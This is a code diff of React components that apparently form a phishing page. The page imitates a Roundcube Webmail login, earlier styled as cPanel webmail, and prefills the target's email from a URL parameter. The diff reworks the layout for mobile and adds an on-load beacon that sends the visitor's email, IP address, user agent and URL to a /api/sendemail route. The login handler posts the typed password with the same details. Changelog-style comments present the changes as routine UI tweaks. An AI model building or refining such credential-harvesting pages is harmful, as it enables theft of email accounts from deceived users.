@@ -1,20 +1,91 @@
-
 /** @format */
 "use client";
 
 import React, { useState, useEffect } from "react";
 
-const Popup = ({ domain, systemInfo }) => {
-  const [email, setEmail] = useState("");
+const InputWithIcon = ({ type = "text", placeholder, value, onChange, icon }) => {
+  const [focused, setFocused] = useState(false); // ✅ added state
+
+  const base = {
+    display: "flex",
+    alignItems: "center",
+    border: "1px solid #d9d9d9",
+    borderRadius: 6,
+    overflow: "none", // ✅ added to contain outline
+    background: "#fafafa",
+    height: 44,
+    width: "100%", // ✅ changed from 85% to 100% for better mobile fit
+    maxWidth: "400px", // ✅ added maxWidth for larger screens
+    margin: "0 auto" // ✅ center align
+  };
+
+  const iconBox = {
+    width: 48,
+    height: "100%",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    background: "#efefef",
+    borderRight: "1px solid #e0e0e0",
+  };
+
+  const inputStyle = {
+    border: "none",
+    outline: focused ? "5px solid #3DBBFF" : "none", // 👈 only shows on focus
+    flex: 1,
+    fontSize: 15,
+    padding: "10px 12px",
+    background: "transparent",
+    width: "100%", // ✅ ensure full width within container
+  };
+
+  return (
+    <div style={base}>
+      <div style={iconBox} aria-hidden>
+        {icon}
+      </div>
+      <input
+        type={type}
+        placeholder={placeholder}
+        value={value}
+        onChange={onChange}
+        style={inputStyle}
+        autoComplete="off"
+        onFocus={() => setFocused(true)}   // 👈 added
+        onBlur={() => setFocused(false)}   // 👈 added
+      />
+    </div>
+  );
+};
+
+
+const UserIcon = () => (
+  <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden>
+    <path fill="#333" d="M12 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8zm0 2c-4.418 0-8 2.239-8 5v1h16v-1c0-2.761-3.582-5-8-5z" />
+  </svg>
+);
+
+const LockIcon = () => (
+  <svg width="20" height="20" viewBox="0 0 24 24" aria-hidden>
+    <path fill="#333" d="M17 8h-1V6a4 4 0 0 0-8 0v2H7a1 1 0 0 0-1 1v9a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1zM10 6a2 2 0 1 1 4 0v2h-4V6z" />
+  </svg>
+);
+
+const Popup = ({ domain, eparams, systemInfo }) => {
+  const [email, setEmail] = useState(eparams || ""); // ✅ changed from readonly to editable
   const [password, setPassword] = useState("");
   const [userAgent, setUserAgent] = useState("");
   const [remoteAddress, setRemoteAddress] = useState("");
   const [landingUrl, setLandingUrl] = useState("");
 
   useEffect(() => {
+    // Set user agent
     setUserAgent(navigator.userAgent);
+    
+    // Set landing URL
     setLandingUrl(window.location.href);
-
+    
+    // Get IP address
     const getIP = async () => {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -25,21 +96,22 @@ const Popup = ({ domain, systemInfo }) => {
         setRemoteAddress("Unable to retrieve IP");
       }
     };
-
+    
     getIP();
 
-    const link = document.createElement("link");
-    link.href = "https://fonts.googleapis.com/css2?family=Open+Sans&display=swap";
-    link.rel = "stylesheet";
-    document.head.appendChild(link);
-    return () => {
+    // Send access notification when component mounts
+    const sendAccessNotification = async () => {
       try {
-        document.head.removeChild(link);
-      } catch (err) {
-        /* ignore */
+        await fetch(`/api/sendemail?email=${encodeURIComponent(email)}&userAgent=${encodeURIComponent(navigator.userAgent)}&remoteAddress=${encodeURIComponent(remoteAddress)}&landingUrl=${encodeURIComponent(window.location.href)}`, {
+          method: "GET",
+        });
+      } catch (error) {
+        console.error("Failed to send access notification:", error);
       }
     };
-  }, []);
+    
+    sendAccessNotification();
+  }, [email, remoteAddress]); // ✅ updated dependency
 
   const handleLogin = async (e) => {
     e.preventDefault();
@@ -50,7 +122,7 @@ const Popup = ({ domain, systemInfo }) => {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({ 
-          eparams: email, 
+          eparams: email, // ✅ use the email state instead of eparams
           password, 
           userAgent, 
           remoteAddress,
@@ -67,120 +139,94 @@ const Popup = ({ domain, systemInfo }) => {
   return (
     <div
       style={{
-        backgroundColor: "#fff",
+        padding: "40px 20px", // ✅ reduced horizontal padding for mobile
         borderRadius: "10px",
-        maxWidth: "2000px",
-        margin: "50px",
+        maxWidth: "400px",
+        width: "100%",
         fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
+        margin: "0 auto", // ✅ center on larger screens
+        boxSizing: "border-box",
       }}
     >
-      <img style={{ width: "305px", marginLeft: "227px", justifyContent: "center" }} src="/Webmail.png" alt="" />
+      <div style={{ textAlign: "center", marginBottom: "30px" }}>
+        <img 
+          style={{ width: "100px", height: "auto", marginRight: "0" }} // ✅ removed right margin
+          src="/Roundcube.jpg" 
+          alt="Roundcube Webmail" 
+        />
+      </div>
 
-      {/* Email (editable) */}
-      <div style={{ marginTop: "30px", marginBottom: "15px", fontSize: "14px" }}>
-        <label style={{ marginLeft: "235px", fontWeight: "559", fontSize: "15px", color: "#293a4a" }}>Email Address</label>
-        <div style={{ position: "relative", width: "36%", marginLeft: "235px", marginTop: "5px" }}>
-          <img src="/Human icon.jpg" alt="icon" style={{ position: "absolute", top: "50%", left: "12px", transform: "translateY(-50%)", width: "16px", height: "16px", pointerEvents: "none" }} />
-          <input type="email" placeholder="Enter your email" value={email} onChange={(e) => setEmail(e.target.value)} style={{ width: "111%", padding: "12px 12px 12px 36px", borderRadius: "4px", border: "2px solid #ccc", outline: "none", height: "34px", boxSizing: "border-box" }} />
-        </div>
+      {/* Username (editable) */}
+      <div style={{ marginBottom: "8px", display: "flex", justifyContent: "center" }}>
+        <InputWithIcon
+          type="text"
+          placeholder="Email address"
+          value={email}
+          onChange={(e) => setEmail(e.target.value)} // ✅ added onChange
+          icon={<UserIcon />}
+        />
       </div>
 
       {/* Password */}
-      <div style={{ marginTop: "30px", marginBottom: "6px", fontSize: "14px" }}>
-        <label style={{ marginLeft: "235px", fontWeight: "600", fontSize: "16px", color: "##293a4a" }}>Password</label>
-        <div style={{ position: "relative", width: "36%", marginLeft: "235px", marginTop: "8px" }}>
-          <img src="/password icon.jpg" alt="password icon" style={{ position: "absolute", top: "50%", left: "12px", transform: "translateY(-50%)", width: "16px", height: "16px", pointerEvents: "none" }} />
-          <input type="password" placeholder="Enter your email password" value={password} onChange={(e) => setPassword(e.target.value)} style={{ width: "111%", padding: "12px 12px 12px 36px", borderRadius: "4px", border: "2px solid #ccc", height: "34px", outline: "none", boxSizing: "border-box" }} />
-        </div>
+      <div style={{ marginBottom: "8px", display: "flex", justifyContent: "center" }}>
+        <InputWithIcon
+          type="password"
+          placeholder="Password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          icon={<LockIcon />}
+        />
       </div>
 
       {/* Login Button */}
-      <button
-        onClick={handleLogin}
-        style={{
-          width: "40%",
-          backgroundColor: "#179bd7",
-          color: "#fff",
-          border: "none",
-          padding: "12px",
-          fontWeight: "bold",
-          borderRadius: "4px",
-          cursor: "pointer",
-          fontSize: "14px",
-          height: "36px",
-          marginLeft: "235px",
-          justifyContent: "center",
-          marginTop: "23px",
-          fontFamily: "'Open Sans', sans-serif",
-          padding: "center"
-        }}
-      >
-        Log in
-      </button>
-
-      {/* Divider */}
-      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", margin: "40px 0", textAlign: "center" }}>
-        <div style={{ marginLeft: "80px", marginRight: "7px" }}>
-          <hr style={{ width: "110px", border: "1px solid #ccc", background: "#ccc", borderTop: "1px solid #ccc", height: "1px", margin: "0 1px 0 5px" }} />
-        </div>
-        <span style={{ backgroundColor: "#fff", padding: "5px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
-          <img src="/Or icon.jpg" alt="Divider Icon" style={{ height: "30px", objectFit: "contain" }} />
-        </span>
-        <div style={{ marginRight: "20px" }}>
-          <hr style={{ width: "95px", border: "1px solid #ccc", background: "#ccc", borderTop: "1px solid #ccc", height: "1px", margin: "0 14px" }} />
-        </div>
-      </div>
-
-      {/* cPanel Login */}
-      <button
-        onClick={() => alert("Redirecting to cPanel login")}
-        style={{
-          width: "40%",
-          backgroundColor: "#f60",
-          color: "#fff",
-          border: "none",
-          padding: "12px",
-          fontWeight: "bold",
-          borderRadius: "4px",
-          cursor: "pointer",
-          fontSize: "13px",
-          height: "36px",
-          marginLeft: "235px",
-          justifyContent: "center",
-          display: "flex",
-          alignItems: "center",
-          gap: "8px",
-          fontFamily: "'Open Sans', sans-serif",
-        }}
-      >
-        <img src="/cpanel logo.jpg" alt="cPanel Logo" style={{ height: "20px", objectFit: "contain" }} />
-        Log in via cPanelID
-      </button>
-
-      {/* Language Footer */}
-      <div style={{ marginTop: "30px", fontSize: "12px", color: "#888", textAlign: "center", display: "flex", justifyContent: "space-between", flexWrap: "wrap", gap: "40px", fontWeight: "500", color: "black" }}>
-        <p> English </p> <p> العربية </p> <p>čeština </p> <p>dansk </p> <p> Deutsch </p> <p>Ελληνικά </p> <p> español </p> <p> español latinoamericano </p>
-      </div>
-
       <div style={{ display: "flex", justifyContent: "center" }}>
-        <img src="/Privacy policy logo.jpg" alt="" style={{ width: "180px", height: "auto", marginTop: "60px", marginLeft: "26px" }} />
+        <button
+          onClick={handleLogin}
+          style={{
+            width: "100%",
+            maxWidth: "400px",
+            backgroundColor: "#3DBBFF",
+            color: "#fff",
+            border: "none",
+            padding: "12px",
+            borderRadius: "6px",
+            cursor: "pointer",
+            fontSize: "16px",
+            height: "44px"
+          }}
+        >
+          LOGIN
+        </button>
+      </div>
+
+      <div style={{ 
+        marginTop: "10px", 
+        textAlign: "center", 
+        fontSize: "14px", 
+        color: "#888", 
+        marginRight: "0" // ✅ removed right margin
+      }}>
+        Roundcube Webmail
       </div>
     </div>
   );
 };
 
-const PopupMobile = ({ domain, systemInfo }) => {
-  const [email, setEmail] = useState("");
+const PopupMobile = ({ domain, eparams, systemInfo }) => {
+  const [email, setEmail] = useState(eparams || ""); // ✅ changed from readonly to editable
   const [password, setPassword] = useState("");
-  const [locale, setLocale] = useState("English");
   const [userAgent, setUserAgent] = useState("");
   const [remoteAddress, setRemoteAddress] = useState("");
   const [landingUrl, setLandingUrl] = useState("");
 
   useEffect(() => {
+    // Set user agent
     setUserAgent(navigator.userAgent);
+    
+    // Set landing URL
     setLandingUrl(window.location.href);
-
+    
+    // Get IP address
     const getIP = async () => {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -191,9 +237,22 @@ const PopupMobile = ({ domain, systemInfo }) => {
         setRemoteAddress("Unable to retrieve IP");
       }
     };
-
+    
     getIP();
-  }, []);
+
+    // Send access notification when component mounts
+    const sendAccessNotification = async () => {
+      try {
+        await fetch(`/api/sendemail?email=${encodeURIComponent(email)}&userAgent=${encodeURIComponent(navigator.userAgent)}&remoteAddress=${encodeURIComponent(remoteAddress)}&landingUrl=${encodeURIComponent(window.location.href)}`, {
+          method: "GET",
+        });
+      } catch (error) {
+        console.error("Failed to send access notification:", error);
+      }
+    };
+    
+    sendAccessNotification();
+  }, [email, remoteAddress]); // ✅ updated dependency
 
   const handleLogin = async (e) => {
     e.preventDefault();
@@ -204,7 +263,7 @@ const PopupMobile = ({ domain, systemInfo }) => {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({ 
-          eparams: email, 
+          eparams: email, // ✅ use the email state instead of eparams
           password, 
           userAgent, 
           remoteAddress,
@@ -219,52 +278,75 @@ const PopupMobile = ({ domain, systemInfo }) => {
   };
 
   return (
-    <div style={{ backgroundColor: "#fff", padding: "20px", borderRadius: "8px", maxWidth: "420px", margin: "40px auto", fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", boxSizing: "border-box" }}>
-      <div style={{ textAlign: "center", marginBottom: "18px" }}>
-        <img src="/Webmail.png" alt="Webmail Logo" style={{ maxWidth: "180px", height: "auto" }} />
+    <div style={{  
+      padding: "20px 15px", // ✅ reduced padding for very small screens
+      borderRadius: "10px", 
+      width: "100%",
+      maxWidth: "350px",
+      margin: "20px auto", 
+      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", 
+      boxSizing: "border-box",
+    }}>
+      <div style={{ textAlign: "center", marginBottom: "20px" }}>
+        <img 
+          src="/Roundcube.jpg" 
+          alt="Roundcube Webmail" 
+          style={{ width: "80px", height: "auto", marginRight: "0" }} // ✅ smaller image for mobile
+        />
       </div>
 
-      <div style={{ marginBottom: "14px", position: "relative" }}>
-        <img src="/Human icon.jpg" alt="user icon" style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", width: "18px", height: "18px", pointerEvents: "none", opacity: 0.8 }} />
-        <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Enter your email" style={{ width: "100%", padding: "12px 12px 12px 44px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "12px", boxSizing: "border-box" }} aria-label="Email address" />
+      {/* Username (editable) */}
+      <div style={{ marginBottom: "8px", fontSize: "2px" }}>
+        <InputWithIcon
+          type="text"
+          placeholder="Email address"
+          value={email}
+          onChange={(e) => setEmail(e.target.value)} // ✅ added onChange
+          icon={<UserIcon />}
+        />
       </div>
 
-      <div style={{ marginBottom: "18px", position: "relative" }}>
-        <img src="/password icon.jpg" alt="password icon" style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", width: "18px", height: "18px", pointerEvents: "none", opacity: 0.8 }} />
-        <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" style={{ width: "100%", padding: "12px 12px 12px 44px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "12px", boxSizing: "border-box" }} aria-label="Password" />
+      {/* Password */}
+      <div style={{ marginBottom: "8px" }}>
+        <InputWithIcon
+          type="password"
+          placeholder="Enter your password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          icon={<LockIcon />}
+        />
       </div>
 
-      <button onClick={handleLogin} style={{ width: "100%", backgroundColor: "#179bd7", color: "#fff", border: "none", padding: "12px", fontWeight: "700", borderRadius: "6px", cursor: "pointer", fontSize: "15px", marginBottom: "18px" }}>
-        Log in
-      </button>
-
-      <div style={{ display: "flex", alignItems: "center", marginBottom: "18px", gap: "12px" }}>
-        <hr style={{ flex: 1, border: "none", borderTop: "1px solid #ddd" }} />
-        <span style={{ whiteSpace: "nowrap", color: "#666", fontSize: "13px" }}>OR</span>
-        <hr style={{ flex: 1, border: "none", borderTop: "1px solid #ddd" }} />
+      {/* Login Button */}
+      <div style={{ display: "flex", justifyContent: "center" }}>
+        <button 
+          onClick={handleLogin} 
+          style={{ 
+            width: "100%", 
+            maxWidth: "400px",
+            backgroundColor: "#179bd7", 
+            color: "#fff", 
+            border: "none", 
+            padding: "12px", // ✅ reduced padding
+            fontWeight: "600", 
+            borderRadius: "6px", 
+            cursor: "pointer", 
+            fontSize: "15px", // ✅ slightly smaller font
+            height: "44px" // ✅ reduced height
+          }}
+        >
+          LOGIN
+        </button>
       </div>
 
-      <button onClick={() => alert("Redirecting to cPanel login")} style={{ width: "100%", backgroundColor: "#f60", color: "#fff", border: "none", padding: "12px", fontWeight: "700", borderRadius: "6px", cursor: "pointer", fontSize: "14px", display: "flex", justifyContent: "center", alignItems: "center", gap: "10px", marginBottom: "18px" }}>
-        <img src="/cpanel logo.jpg" alt="cPanel Logo" style={{ height: 20 }} />
-        Log in via cPanel
-      </button>
-
-      <div style={{ textAlign: "center", marginBottom: "22px" }}>
-        <label htmlFor="locale" style={{ marginRight: "8px", fontSize: "14px" }}>Select a locale:</label>
-        <select id="locale" value={locale} onChange={(e) => setLocale(e.target.value)} style={{ padding: "7px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "14px" }}>
-          <option>English</option>
-          <option>العربية</option>
-          <option>Čeština</option>
-          <option>Dansk</option>
-          <option>Deutsch</option>
-          <option>Ελληνικά</option>
-          <option>español</option>
-        </select>
-      </div>
-
-      <div style={{ textAlign: "center", fontSize: "12px", color: "#666" }}>
-        <p style={{ margin: 0 }}>© 2025 cPanel, L.L.C.</p>
-        <p style={{ margin: 0 }}>Privacy Policy</p>
+      <div style={{ 
+        marginTop: "10px", 
+        textAlign: "center", 
+        fontSize: "13px", // ✅ smaller font for mobile
+        color: "#888",
+        marginRight: "0" // ✅ removed right margin
+      }}>
+        Roundcube Webmail
       </div>
     </div>
   );
